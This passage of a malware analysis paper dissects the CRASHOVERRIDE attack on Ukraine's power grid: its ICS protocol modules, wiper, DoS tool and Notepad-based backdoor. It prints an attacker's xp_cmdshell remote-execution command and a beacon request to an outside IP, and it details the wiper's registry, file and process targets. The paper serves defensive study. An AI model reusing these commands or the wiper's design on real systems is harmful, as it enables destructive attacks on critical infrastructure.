<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/fa687171d1f599f28160e6cec3ffdd5e_f3110.jpg" alt="figure7_IEC104_ProgramFlow.jpg" width="600" height="600" /><span class="centered-caption">Figure 7: IEC-104 program flow.<a class=" anchor" name="figure8"></a></span></p>
<p> </p>
<p> <img style="display: block; margin-left: auto; margin-right: auto;" src="/files/3615/3967/1162/Figure8_Wiper_Module_Registry_Manipulation.png" alt="Figure8_Wiper_Module_Registry_Manipulation.png" width="998" height="411" /></p>
<p class="centered-caption">Figure 8: Wiper module registry manipulation.</p>
<p> </p>
<h4><a class="chapter" name="h4-iec-61850"></a>IEC-61850</h4>
<p>IEC-61850 is a standard for substation communications with a global footprint, and with development efforts contributed by ABB [<a href="#ref8">8</a>, <a href="#ref9">9</a>]. As such, this protocol features a much broader adoption than IEC-101 and IEC-104 and is more concerning for operators globally given this larger usage footprint.</p>
<p>Within recovered data, two versions of the IEC-61850 attack module were recovered: an EXE specifying a configuration file, and a DLL using the same ‘Crash’ export functionality as other recovered samples. An examination of the ‘WinMain’ routine for the EXE (Figure 9) and the ‘Crash’ export for the DLL (Figure 10) show initialization to be essentially the same as in previous modules, with the exception of the EXE’s specification of a configuration file, ‘i.ini’, located in the same directory. As a result, the EXE can be run as a stand-alone executable with no parameters aside from the presence of a configuration file (all options are hard coded), while the DLL requires the launcher with parameters specified.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/2415/3967/1222/figure9_61850exe_Initialization.png" alt="figure9_61850exe_Initialization.png" width="637" height="280" /><span class="centered-caption">Figure 9: IEC-61850 EXE initialization.</span><br /><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/5915/3967/1251/figure10_61850dll_CRASH.png" alt="figure10_61850dll_CRASH.png" width="618" height="339" /><span class="centered-caption">Figure 10: IEC-61850 DLL crash.</span></p>
<p>While a configuration file is specified (simply containing a list of IP addresses, one per line) both versions of the attack module also have functionality to dynamically perform network discovery. This is performed by first enumerating all network adapters on the victim machine, then enumerating all IPs connected to the network interfaces. Based on the network address and broadcast address for connected IPs, the module then attempts to connect to every IP in the subnet via broadcast address. Each successful connection is stored in an internal array matching the format of ‘i.ini’. While effective, this routine represents a very blunt (and exceptionally noisy) mechanism for indiscriminately identifying other hosts within the network.</p>
<p>Actual communications with devices take place via TCP 102, the default listening port for this targeted version of IEC-61850-compliant communication. In this context, it is important to note that actual communications leverage Manufacturing Message Specification (MMS), while IEC-61850 provides the standard for addressing these messages within IEC-61850-1 [<a href="#ref10">10</a>]. Based on this, the modules gather and enumerate control points from devices corresponding to switches and breakers within the configuration file, with the ultimate goal of toggling designated control points following enumeration to either OPEN (0) or CLOSE (1) states. This provides effectively similar functionality (in terms of physical impact) to that of the IEC-101 and IEC-104 modules.</p>
<p> </p>
<h4><a class="chapter" name="h4-opc"></a>OPC</h4>
<p>OLE for Process Control (OPC), and specifically the Data Access (DA) standard [<a href="#ref11">11</a>], were targeted by CRASHOVERRIDE’s OPC-DA module. The standard is an OPC Foundation specification that ‘defines how real-time data can be transferred between a data source and a data sink (for example: a PLC and an HMI) without either of them having to know each other’s native protocol’ [<a href="#ref12">12</a>]. This module exists as a stand-alone executable. Examining available log and forensics data, the module is called via a remote execution routine with no need for support files, making it distinct from other modules:</p>
<pre>EXEC xp_cmdshell ‘cscript C:\Delta\remote.vbs /s:&lt;TargetIP&gt; /u:&lt;Host/Domain&gt;\&lt;User&gt; /p:&lt;Password&gt; /t:-r cmd /c start c:\Intel\opc.exe’;</pre>
<p>Examining the file supports the above conclusion. First, the module appears to re-use source code from a publicly available OPC client toolkit [<a href="#ref13">13</a>]. Second, no configuration file is necessary or referenced in the code, indicating that the binary should be able to perform some auto-discovery function. The module includes functionality for both local and remote enumeration of OPC server instances, but only local discovery is called. While default credentials appear to be hard coded for remote access in the MakeRemoteHost function (user ‘Administrator’ and password ‘<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="615010001221363239">[email&#160;protected]</a>’), the specification still requires a hostname for the target device, which does not appear to be provided anywhere, and the function is never actually used.</p>
<p>The module is therefore limited to enumerating and interacting with local OPC server instances running on the infected host. Thus, unlike the other CRASHOVERRIDE modules, the OPC module is designed to run on the host providing ICS-related functionality and control, rather than sending messages ‘downstream’ to another device.</p>
<p>From an enumeration perspective, the program attempts to identify local items:</p>
<ul>
<li>ctlSelOn</li>
<li>ctlSelOff</li>
<li>ctlOperOn</li>
<li>ctlOperOff</li>
<li>stVal</li>
</ul>
<p>Once this is complete, responding items are logged, then ‘ctlOperOn’ and ‘ctlSelOn’ are set (irrespective of their status during enumeration). Next, the module turns the same items off by setting ‘ctlOperOff’ and ‘ctlSelOff’. This corresponds to opening breakers or turning a selected pathway ‘off’, bringing functionality in line with previously discussed modules.</p>
<p> </p>
<h4><a class="chapter" name="h4-hybrid-payload-opc-61850"></a>Hybrid payload: OPC + 61850</h4>
<p>ELECTRUM deployed a binary, named ‘imapi.dll’, that combines functionality for both the 61850 and OPC modules detailed above. As displayed in Figure 11, the ‘Crash’ export creates two threads in sequence: the first for a routine duplicating OPC module functionality, the second essentially replicating the 61850 modules.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/1115/3967/1374/figure11_IMAPI_SequentialThreatCreate.png" alt="figure11_IMAPI_SequentialThreatCreate.png" width="615" height="517" /><span class="centered-caption">Figure 11: IMAPI sequential ThreadCreate.</span></p>
<p>Of note, this slightly more complex sample features a later execution time for effects delivery than others observed thus far: 20 December 2016 06:30 UTC. This corresponds to the ‘second round’ of attacks after the initial timing of around midnight on 17 December 2016. While this may seem to be a follow-on attack, compilation timestamps preserved as debug directory artifacts indicate that imapi was compiled before the initial outages and was therefore a pre-planned attack designed to occur at a later time. One possibility, based on the functionality of the two protocols, is that the paired attack is designed to overcome environmental fail-safes: notably, switchgear refusing to open if circuit breakers are not open to prevent arc. Combining the two payloads allows for OPC to target breakers (and potentially switchgear as well) while 61850 impacts switchgear. In combination, this would overcome operational fail-safes to deliver an electric distribution impact.</p>
<p> </p>
<h4><a class="chapter" name="h4-wiper-module"></a>Wiper module</h4>
<p>The destructive, or ‘wiper’, module represents the last stage of the CRASHOVERRIDE attack. Following a two-hour timer (in samples available for analysis), the launcher executable once again looks for the exported ‘Crash’ function, but this time in a separate, hard-coded file that must be co-located in the specified working directory, ‘haslo.dat’.</p>
<p>The wiper consists of three stages:</p>
<ol>
<li>Overwrite system service registry entries to null values to render the system unbootable.</li>
<li>Remove files relating to ICS operations to impede recovery and system restoration.</li>
<li>Terminate system processes to cause a crash and system shutdown.</li>
</ol>
<p>First, the wiper moves to make the system unbootable by manipulating services listed in the following registry hive:</p>
<p class="monospace" style="padding-left: 30px;">SYSTEM\CurrentControlSet\Services</p>
<p>For each system service, the image path is cleared. On system restart, the machine will be unable to load system services, resulting in a failure to boot the OS (see <a href="#figure8">Figure 8</a>).<a href="#footnote2"><sup>2</sup></a></p>
<p>Next, the wiper enumerates the infected machine for all drives C-Z except ‘V:\’. The wiper then looks for various generic file formats (e.g. ‘.exe’, ‘.zip’, ‘.tar’) as well as files with more specific extensions (as listed in Table 1) for deletion.</p>
<table class="table table-bordered" border="0">
<tbody>
<tr>
<td><strong>File/extension</strong></td>
<td><strong>Assessed purpose</strong></td>
</tr>
<tr>
<td>SYS_BASCOM.COM</td>
<td>ABB SYS600 base system configuration file</td>
</tr>
<tr>
<td>*.pcmp</td>
<td>ABB PCM600 project file</td>
</tr>
<tr>
<td>*.pcmi</td>
<td>ABB PCM600 IEC file</td>
</tr>
<tr>
<td>*.pcmt</td>
<td>ABB PCM600 template IED file</td>
</tr>
<tr>
<td>*.pl</td>
<td>Programmable logic file (vendor neutral)</td>
</tr>
<tr>
<td>*paf</td>
<td>PLC archive file (vendor neutral)</td>
</tr>
<tr>
<td>*.scl</td>
<td>Substation configuration language (IEC-61850)</td>
</tr>
<tr>
<td>*.cid</td>
<td>Configured IED description</td>
</tr>
<tr>
<td>*.scd</td>
<td>Substation configuration description (IEC-61850)</td>
</tr>
<tr>
<td>*.xrf</td>
<td>Cross reference file used in ABB MicroSCADA</td>
</tr>
<tr>
<td>*.v</td>
<td>Possibly AutoCAD</td>
</tr>
<tr>
<td>*.trc</td>
<td>Trace file type specified in OPC DA</td>
</tr>
<tr>
<td>*.cin</td>
<td>ABB MicroSCADA specific file</td>
</tr>
<tr>
<td>*.ini</td>
<td>MicroSCADA documentation uses INI files extensively</td>
</tr>
<tr>
<td>*.prj</td>
<td>ABB control builder</td>
</tr>
<tr>
<td>*.mdf</td>
<td>Database format</td>
</tr>
<tr>
<td>*.ldf</td>
<td>Database format</td>
</tr>
<tr>
<td>*.bak</td>
<td>ABB SYS600 project files use BAK for backup files</td>
</tr>
</tbody>
</table>
<p class="centered-caption">Table 1: File extensions searched for by the wiper for deletion.</p>
<p>Overall, the file types referenced are for ABB equipment, specifically the ABB MicroSCADA product line [<a href="#ref15">15</a>]. Essentially, the wiper looks to eliminate files relating to grid operations in order to inhibit service restoration and recovery based on previously saved, known-good configurations.</p>
<p>Finally, the wiper proceeds to terminate system processes to force a system crash:</p>
<ul class="monospace">
<li>audiodg.exe</li>
<li>lsm.exe</li>
<li>svchost.exe</li>
<li>conhost.exe</li>
<li>services.exe</li>
<li>taskhost.exe</li>
<li>csrss.exe</li>
<li>shutdown.exe</li>
<li>wininit.exe</li>
<li>dwm.exe</li>
<li>smss.exe</li>
<li>winlogon.exe</li>
<li>explorer.exe</li>
<li>spoolss.exe</li>
<li>wuauclt.exe</li>
<li>lsass.exe</li>
<li>spoolsv.exe</li>
</ul>
<p>At this stage, the impacted system – a device sitting ‘one hop’ away from the target ICS equipment for the specified impact module – is shut down, with immediate system restoration impossible without recourse to boot disks and non-standard manipulation of the impacted host. Furthermore, unless backups of relevant files are kept elsewhere in the network, precise ICS and SCADA service restoration is impossible due to the loss of configuration files.</p>
<p> </p>
<h3><a class="chapter" name="h3-primary-backdoor-module"></a>Primary backdoor module</h3>
<p><em>ESET</em> and initial <em>Dragos</em> reports all identified a primary backdoor initiating events for the CRASHOVERRIDE attack. As indicated above, subsequent analysis based on newly available data from the event indicates that this backdoor was <em>not</em> necessary for CRASHOVERRIDE and, based on recovered forensic artifacts, may not have been used to execute the attacks.</p>
<p>Admittedly, even with a far greater corpus of data than was available in June 2017 when CRASHOVERRIDE was first publicly disclosed, there remain gaps, therefore it is possible that other aspects of the attack relied on this custom backdoor. Nonetheless, a review of operations and software functionality indicate that this component – which is also the component that most resembles traditional malware and is easiest to detect via traditional security measures – is not necessary for executing a CRASHOVERRIDE-like event.</p>
<p>As this module has already received extensive coverage and analysis in other publications (namely <em>ESET</em>’s Industroyer analysis and <em>Dragos</em>’ CRASHOVERRIDE whitepaper), we will not examine it further here.</p>
<p> </p>
<h3><a class="chapter" name="h3-impeding-recovery"></a>Impeding recovery</h3>
<p>In addition to the wiper module described previously, ELECTRUM also deployed a denial of service capability leveraging a previously disclosed and patched vulnerability in <em>Siemens SIPROTEC</em> equipment, CVE-2015-5374 [<a href="#ref16">16</a>]. The vulnerability was patched in 2015 – still relatively recent for device patching in ICS environments considering the attack took place in late 2016. The <em>SIPROTEC</em> device itself plays supporting and enabling roles in IEC-61850 communications and SCADA control, making it a potentially effective target to further disrupt operations during the attack by inhibiting operator control.</p>
<p>Unfortunately, in designing this software, which is appropriately named ‘dos.exe’, the attacker successfully implemented the specially crafted traffic to UDP 50000 that would trigger a denial of service condition, but failed to implement byte conversion for IP addresses when creating sockets. As a result, the module sends traffic to invalid, incorrect IP addresses. For example, if targeting 192.1.2.3, the created socket would send traffic to 3.2.1.192.</p>
<p>As implemented, the ‘dos.exe’ module includes a hard-coded list of IP addresses for attack. As a result, even if this error is caught at run-time, the adversary could not ‘fudge’ execution by reading in a modified list of ‘reversed’ IP addresses. Thus this module is effectively useless for the attack.</p>
<p> </p>
<h3><a class="chapter" name="h3-alternate-backdoor"></a>Alternate backdoor</h3>
<p>Finally, an additional backdoor component was discovered in the intrusion and originally noted by ESET in mid-2017. The backdoor itself is a modified copy of <em>Windows Notepad</em>. Within the environment, the file – based on exif and metadata – appears to be a legitimate, albeit older, copy of <em>Notepad</em>:</p>
<pre>File Size                  : 72 kB<br />File Type                 : Win32 EXE<br />File Type Extension  : exe<br />MIME Type              : application/octet-stream<br />Machine Type          : Intel 386 or later, and compatibles<br />Time Stamp            : 2008:04:13 12:35:51-06:00<br />PE Type                  : PE32<br />Subsystem              : Windows GUI<br />File OS                    : Windows NT 32-bit<br />Object File Type       : Executable application<br />Language Code       : English (U.S.)<br />Company Name       : Microsoft Corporation<br />File Description        : Notepad<br />File Version             : 5.1.2600.5512 (xpsp.080413-2105)<br />Internal Name         : Notepad<br />Legal Copyright       : © Microsoft Corporation. All rights reserved.<br />Original File Name   : NOTEPAD.EXE<br />Product Name         : Microsoft® Windows® Operating System<br />Product Version       : 5.1.2600.5512</pre>
<p>However, a review of plaintext strings immediately indicates something altered in the file. In addition to obfuscated program sections, the following observables appear:</p>
<pre>RegisterPenApp<br />notepad.chm<br />hhctrl.ocx<br />CLSID\{ADB880A6-D8FF-11CF-9377-00AA003B7A11}\InprocServer32</pre>
<p>Further research has identified samples exhibiting these static characteristics ranging from January 2016 (nearly a year before CRASHOVERRIDE) to the present. The programs themselves all launch a call-out to a hard-coded, but obfuscated, network address. Unfortunately, the exact purpose of this call-out is not completely clear at present. The observed traffic is likely a call-out beacon to initiate connection back to the executing host.</p>
<p>Several examples are evident in CRASHOVERRIDE data. One sample, named ‘csvd.exe’, produces the following call-out:</p>
<pre>GET /8C7SW HTTP/1.1<br />Cache-Control: no-cache<br />Connection: Keep-Alive<br />Pragma: no-cache<br />Host: 188.42.253.43:8820</pre>
<p>Other examples recovered ‘in the wild’ include beacons to private addresses, public addresses with a destination port of TCP 4444 (potentially indicative of a Meterpreter payload), and other variations. At present, without complete traffic flows and additional context, this item remains somewhat mysterious in terms of its ultimate, complete functionality.</p>
<p>The IP address in question is unremarkable, belonging to a Singapore-based hosting provider with no associated domains. This is potentially adversary-owned infrastructure but it is more likely that it represents legitimate network space compromised by the adversary for first-hop communications.</p>
<p>At present, it is not certain if this tool represents an ELECTRUM-exclusive item or the re-purposing of a common backdoor by the group for the CRASHOVERRIDE attack. Work on this item continues.</p>
<p> </p>
<h2><a class="chapter" name="h2-context-and-mitigation"></a>Context and mitigation</h2>
<p>Reviewing the entirety of the CRASHOVERRIDE event – from initial intrusion through ICS-focused physical impact – several interesting items emerge:</p>
<ul>
<li>Except for the final ICS-focused payloads, almost no malware was used in the attack. The primary backdoor mechanism, discussed earlier, may not even have been used based on available information, and other malicious software variants represent publicly available frameworks such as Mimikatz.</li>
<li>Network intrusion, information gathering and pivoting all relied on credential capture and re-use and leveraging legitimate system tools for execution.</li>
<li>The timeframe of the overall intrusion is measured in months, but the shift to ICS impacts took place in a matter of weeks beginning in mid-December, potentially fuelled by earlier reconnaissance.</li>
</ul>
<p>Based on all of the above items, ELECTRUM’s CRASHOVERRIDE attack represents both a sophisticated event (in terms of designing ICS-specific malicious payloads) and an example of fairly standard intrusion activities such as ‘living off the land’<a href="#footnote3"><sup>3</sup></a>. This mixed set of capabilities – from relatively advanced to commodity, ‘pentester 101’ – reveal an interesting aspect of both ELECTRUM and ICS intrusion events in general: while the ultimate impact scenario generally requires some specialized knowledge, actual network intrusion requires no especially advanced set of skills.</p>
<p>From a detection and response standpoint, especially when considered across the kill chain (<a href="#figure2">Figure 2</a>), identifying seemingly ‘commodity’ tactics within the context of the ICS environment is incredibly valuable. Typical binary defence focuses on anti-virus – yet anti-virus is largely designed to capture items that corrupt or subvert local or remote Windows processes and not programs designed to deliver ICS impacts. In the case of CRASHOVERRIDE, the only aspects that would fall under typical anti-virus detection are the Mimikatz variant and the ‘primary’ backdoor (which prior analysis indicates is not even a necessary component for the attack). Instead, identifying authentication information within the network, binary movement between IT and ICS and within ICS, and system alterations on critical hosts controlling ICS equipment, all would serve to detect – and form the foundation for mitigating – a CRASHOVERRIDE-type attack. Essentially, defenders need to tune detections and response from IT-centric approaches to ICS-specific capabilities, including capturing malicious behaviours – such as the rampant authentication and remote process activity exhibited by ELECTRUM – indicative of a ‘malware-less’ compromise event.</p>
<p>Unfortunately, the state of the modern ICS environment typically lacks the level of visibility – definitely on host, but also to a certain extent in network – that would allow such actions to be identified and tracked. Only by increasing visibility then orienting detection and monitoring toward adversary behaviours will ICS defenders be able to protect effectively against the next CRASHOVERRIDE attack. Given the peculiars of ICS intrusions – from ‘living off the land’ for standard <em>Windows</em> system compromise to bespoke ICS malware for ultimate effects – traditional, <em>Windows</em>-centric security solutions may not be the answer. Instead, ICS owners and operators will need to embrace the challenge provided by groups such as ELECTRUM and learn their environment, increase visibility, and determine at what point the merely ‘anomalous’ becomes malicious.</p>
<p>In this fashion, defenders can defend not merely against a CRASHOVERRIDE variant, but against entire classes of malicious activity. By focusing on necessary adversary actions – such as credential capture and binary movement for final effects – defenders can create necessary traffic and detection ‘choke points’ to monitor for and respond to such required activities. While this will not be easy, such a robust approach represents the only sure means of securing the ICS environment moving forward.</p>
<p> </p>
<h2><a class="chapter" name="h2-acknowledgements"></a>Acknowledgements</h2>
<p>Few efforts are ever completely solitary in nature, and information security stands out as a discipline where this is almost never the case. When reviewing the CRASHOVERRIDE data, this paper represents the culmination of efforts put forth by multiple individuals over a significant period of time, including: Dan Gunter, Ben Miller, Lesley Carhart, Selena Larson, and Jimmy Wylie.</p>
<p> </p>
<h2><a class="chapter" name="h2-references"></a>References</h2>
<p><a class=" anchor" name="ref1"></a>[1] Confirmation of a Coordinated Attack on the Ukrainian Power Grid. SANS Institute. <a href="https://ics.sans.org/blog/2016/01/09/confirmation-of-a-coordinated-attack-on-the-ukrainian-power-grid#" target="_blank">https://ics.sans.org/blog/2016/01/09/confirmation-of-a-coordinated-attack-on-the-ukrainian-power-grid#</a>.</p>
<p><a class=" anchor" name="ref2"></a>[2] Control System Historian. ICS-CERT. <a href="https://ics-cert.us-cert.gov/Control_System_Historian-Definition.html" target="_blank">https://ics-cert.us-cert.gov/Control_System_Historian-Definition.html</a>.</p>
<p><a class=" anchor" name="ref3"></a>[3] xp_cmdshell. Microsoft. <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017" target="_blank">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017</a>.</p>
<p><a class=" anchor" name="ref4"></a>[4] Create Linked Servers. Microsoft. <a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-2017" target="_blank">https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-2017</a>.</p>
<p><a class=" anchor" name="ref5"></a>[5] PSExec. Microsoft Sysinternals. <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a>.</p>
<p><a class=" anchor" name="ref6"></a>[6] WIN32/Industroyer: A New Threat for Industrial Control Systems (‘Main Backdoor’ section). ESET. <a href="https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf" target="_blank">https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf</a>.</p>
<p><a class=" anchor" name="ref7"></a>[7] CRASHOVERRIDE: Analysis of the Threat to Electric Grid Operations. Dragos. <a href="https://dragos.com/blog/crashoverride/" target="_blank">https://dragos.com/blog/crashoverride/</a>.</p>
<p><a class=" anchor" name="ref8"></a>[8] IEC 61850: What You Need to Know About Functionality and Practical Implementation. Schweitzer Engineering Laboratories. <a href="https://selinc.com/api/download/3671/" target="_blank">https://selinc.com/api/download/3671/</a>.</p>
<p><a class=" anchor" name="ref9"></a>[9] IEC 61850 Power Utility Automation – ABB. <a href="https://new.abb.com/substation-automation/systems/iec-61850" target="_blank">https://new.abb.com/substation-automation/systems/iec-61850</a>.</p>
<p><a class=" anchor" name="ref10"></a>[10] RFC1006. IETF. <a href="https://tools.ietf.org/html/rfc1006" target="_blank">https://tools.ietf.org/html/rfc1006</a>.</p>
<p><a class=" anchor" name="ref11"></a>[11] OLE for Process Control Data Access Automation Interface Standard. <a href="https://www-bd.fnal.gov/controls/opc/OPC_DA_Auto_2.02_Specification.pdf" target="_blank">https://www-bd.fnal.gov/controls/opc/OPC_DA_Auto_2.02_Specification.pdf</a>.</p>
<p><a class=" anchor" name="ref12"></a>[12] OPC Data Access (OPC DA) Versions and Compatibility. Matrikon. <a href="https://www.matrikonopc.com/opc-server/opc-data-access-versions.aspx" target="_blank">https://www.matrikonopc.com/opc-server/opc-data-access-versions.aspx</a>.</p>
<p><a class=" anchor" name="ref13"></a>[13] <a href="https://sourceforge.net/projects/opcclient/files/OPCClientToolKit/" target="_blank">https://sourceforge.net/projects/opcclient/files/OPCClientToolKit/</a>.</p>
<p><a class=" anchor" name="ref14"></a>[14] Olympic Destroyer. Talos. <a href="https://blog.talosintelligence.com/2018/02/olympic-destroyer.html" target="_blank">https://blog.talosintelligence.com/2018/02/olympic-destroyer.html</a>.</p>
<p><a class=" anchor" name="ref15"></a>[15] MicroSCADA Pro. ABB. <a href="https://new.abb.com/network-management/network-management/microscada-pro" target="_blank">https://new.abb.com/network-management/network-management/microscada-pro</a>.</p>
<p><a class=" anchor" name="ref16"></a>[16] Siemens SIPROTEC Denial-of-Service Vulnerability. ICS-CERT. <a href="https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01" target="_blank">https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01</a>.</p>
<p><a class=" anchor" name="ref17"></a>[17] Living Off the Land and Fileless Attack Techniques. Symantec. <a href="https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf" target="_blank">https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf</a>.</p>
<p> </p>
<h2><a class="chapter" name="h2-footnotes"></a>Footnotes</h2>
<p><sup><a class=" anchor" name="footnote1"></a>1 </sup>Hashes for all recovered samples and malware can be found in Appendix A.</p>
<p><sup><a class=" anchor" name="footnote2"></a>2 </sup>In some respects, this behaviour is functionally (in terms of outcome) equivalent to the service wiping function used in the Olympic Destroyer event (see [<a href="#ref14">14</a>]). However, the two are implemented differently, thus not indicating any definitive link between the entities responsible.</p>
<p><sup><a class=" anchor" name="footnote3"></a>3 </sup>Although used elsewhere, a term best explained in [<a href="#ref17">17</a>].</p>
<p> </p>
<h2><a class="chapter" name="h2-appendix-list-sample-hashes"></a>Appendix A – List of sample hashes</h2>
<p>The following list includes recovered sample hashes from CRASHOVERRIDE, including binaries and scripts.</p>
<table class="table table-bordered" border="0">
<tbody>
<tr>
<td><strong>Name</strong></td>
<td><strong>SHA256</strong></td>
<td><strong>Function</strong></td>
</tr>
<tr>
<td>101_copy.bat</td>
<td>a95f6d43e62a5cfb4e95667df9b04d07b60d103b36f4cff12c07e7c2dab88a98</td>
<td>Runs ufn.vbs and sqlc.vbs, copies 101 payloads to specified hosts</td>
</tr>
<tr>
<td>104.bat</td>
<td>07d5d5ba8cd17efab2ebf3b76cb6b61825249518c11c3910ceb6473e0efb3deb</td>
<td>Runs sqlc.vbs, configures ImapiService</td>
</tr>
<tr>
<td>104.dll</td>
<td>7907dd95c1d36cf3dc842a1bd804f0db511a0f68f4b3d382c23a3c974a383cad</td>
<td>104 effects module</td>
</tr>
<tr>
<td>104_copy.bat</td>
<td>693c631f1673bd61135080e9b4759342c5835d20231f6f4f7b55117fda111e4f</td>
<td>Runs ufn.vbs and sqlc.vbs, copies 104 payloads to specified hosts</td>
</tr>
<tr>
<td>104_copy.bat</td>
<td>a95f6d43e62a5cfb4e95667df9b04d07b60d103b36f4cff12c07e7c2dab88a98</td>
<td>Runs ufn.vbs and sqlc.vbs, copies 104 payloads to specified hosts</td>
</tr>
<tr>
<td>61850.dll</td>
<td>4e7d2b269088c1575a31668d86de95fd3dde6caa88051d7ec110f7f150058789</td>
<td>61850 effects module - DLL variant</td>
</tr>
<tr>
<td>61850.exe</td>
<td>55e7471ad841bd8a110818760ea89af3bb456493f0798a54ce3b8e7b790afd0a</td>
<td>61850 effects module - EXE variant</td>
</tr>
<tr>
<td>alg.exe</td>
<td>3e3ab9674142dec46ce389e9e759b6484e847f5c1e1fc682fc638fc837c13571</td>
<td>Primary backdoor</td>
</tr>
<tr>
<td>avtask.exe</td>
<td>37d54e3d5e8b838f366b9c202f75fa264611a12444e62ae759c31a0d041aa6e4</td>
<td>Primary backdoor</td>
</tr>
<tr>
<td>avtask.exe</td>
<td>7e96849c69263e0125419a3fbb2547050329b7189db599d8136650171818bd81</td>
<td>Primary backdoor</td>
</tr>
<tr>
<td>avtask2.exe</td>
<td>41658472df4074a0a2a2298ba3f17e0b17112fed99e495bf34dac138d6f7b247</td>
<td>Primary backdoor</td>
</tr>
<tr>
<td>c.exe</td>
<td>502402f8568359645d50f1d6e58ab927f05702f6220b60767897b3912b761b99</td>
<td>Primary backdoor</td>
</tr>
<tr>
<td>csvd.exe</td>
<td>f6e62b1d75d91171ab30e8985189ea5aacd947c887222fdb58acbc2db2542f64</td>
<td>Backdoor NOTEPAD variant</td>
</tr>
<tr>
<td>csvf.exe</td>
<td>767b078645baef34cfb366a41df8fe65bcce597c2bc9c08cae063d287f7a8011</td>
<td>Backdoor NOTEPAD variant</td>
</tr>
<tr>
<td>csvnpr.exe</td>
<td>9860c3d30233c7f1c6631caefa2b6632a01b2b729909bc0dd894c5b418b4eb1b</td>
<td>Backdoor NOTEPAD variant</td>
</tr>
<tr>
<td>defragsvc.exe</td>
<td>21c1fdd6cfd8ec3ffe3e922f944424b543643dbdab99fa731556f8805b0d5561</td>
<td>Launcher module</td>
</tr>
<tr>
<td>dos.exe</td>
<td>4587ccfecc9a1ff5c5538a3475409ca1687d304bcde252077a119c436296857b</td>
<td>Siemens SIPROTEC DoS module</td>
</tr>
<tr>
<td>ep.exe</td>
<td>3ca252fb405c83cceea25041c3f1c01bead8f1afe0144f8cdee795bb868a903d</td>
<td>Primary backdoor</td>
</tr>
<tr>
<td>haslo.dat</td>
<td>018eb62e174efdcdb3af011d34b0bf2284ed1a803718fba6edffe5bc0b446b81</td>
<td>Destructive module</td>
</tr>
<tr>
<td>haslo.exe</td>
<td>ad23c7930dae02de1ea3c6836091b5fb3c62a89bf2bcfb83b4b39ede15904910</td>
<td>Destructive module</td>
</tr>
<tr>
<td>ilaunchr.exe</td>
<td>c57e390d4c1ba116a28fe618d407395d261f25c2901d1fe68f420fb47a26f444</td>
<td>Primary backdoor</td>
</tr>
<tr>
<td>imapi.dll</td>
<td>12ba9887d3007b0a0713d9f1973e1176bd33eccb017b5a7dba166c7c172151e9</td>
<td>Hybrid 61850 and OPC effects module</td>
</tr>
<tr>
<td>imapi.exe</td>
<td>56ae7705ffcd56e74e5aecb0e43f17d510c2eaaddc7356f991c0db1daf32a641</td>
<td>Hybrid 61850 and OPC effects module launcher</td>
</tr>
<tr>
<td>ImapiService.exe</td>
<td>7cc9ac6383437dd96161b93b017500a22a2c8d05f58778b9b9fce8ea73304546</td>
<td>Launcher module</td>
</tr>
<tr>
<td>ld.exe</td>
<td>13a71a050d20aaad43ef78d771f22d636475b2ef8e4918731ff64d162287c480</td>
<td>UPX-packed credential dumper using extensive Mimikatz source code</td>
</tr>
<tr>
<td>mm.exe</td>
<td>286c63d24fe9259bb6a758ce86e48c7f9094304ce4a32054641923a8cb4eab3c</td>
<td>UPX-packed Mimikatz</td>
</tr>
<tr>
<td>npadpr.exe</td>
<td>376c0608820598f2f20666a82e1d801fce347233e2051010fbcf43c8278220dc</td>
<td>Backdoor NOTEPAD variant</td>
</tr>
<tr>
<td>opc.exe</td>
<td>156bd34d713d0c8419a5da040b3c2dd48c4c6b00d8a47698e412db16b1ffac0f</td>
<td>Stand-alone module</td>
</tr>
<tr>
<td>pa.vbs</td>
<td>fb5bbea0f1acfcf123979e4c615d54474c4f079276ee3828f5b8613bb3bbdf26</td>
<td>System recon</td>
</tr>
<tr>
<td>rm.vbs</td>
<td>fb5bbea0f1acfcf123979e4c615d54474c4f079276ee3828f5b8613bb3bbdf26</td>
<td>System recon</td>
</tr>
<tr>
<td>swprv.exe</td>
<td>dcb7d2fc46f61d5522e005ac66f3f0661e2d5284d5a3f8b3a0c8b4050d8397a7</td>
<td>Variant of primary backdoor</td>
</tr>
<tr>
<td>tiering.exe</td>
<td>9a12493af09b0711edb0d6797fb195c64f3ca65437dd6274b171ebd22558172c</td>
<td>Backdoor NOTEPAD variant</td>
</tr>
<tr>
<td>tiersvc.exe</td>
<td>ecaf150e087ddff0ec6463c92f7f6cca23cc4fd30fe34c10b3cb7c2a6d135c77</td>
<td>Primary backdoor</td>
</tr>
<tr>
<td>ws.exe</td>
<td>6d707e647427f1ff4a7a9420188a8831f433ad8c5325dc8b8cc6fc5e7f1f6f47</td>
<td>Primary backdoor</td>
</tr>
</tbody>
</table>
<p> </p>
<h2><a class="chapter" name="h2-appendix-b-remote-execution-and-survey-script"></a>Appendix B – Remote execution and survey script</h2>
<p>As the script is lengthy, the below are selections from the file ‘remote.vbs’ to show the most relevant portions of the script:</p>
<p> </p>
<p class="monospace" style="padding-left: 30px;">On Error Resume Next</p>
<p class="monospace" style="padding-left: 30px;">Set WshShell = WScript.CreateObject("WScript.Shell")<br />Set WshNetwork = WScript.CreateObject("WScript.Network")<br />Set FSO = WScript.CreateObject("Scripting.FileSystemObject")</p>
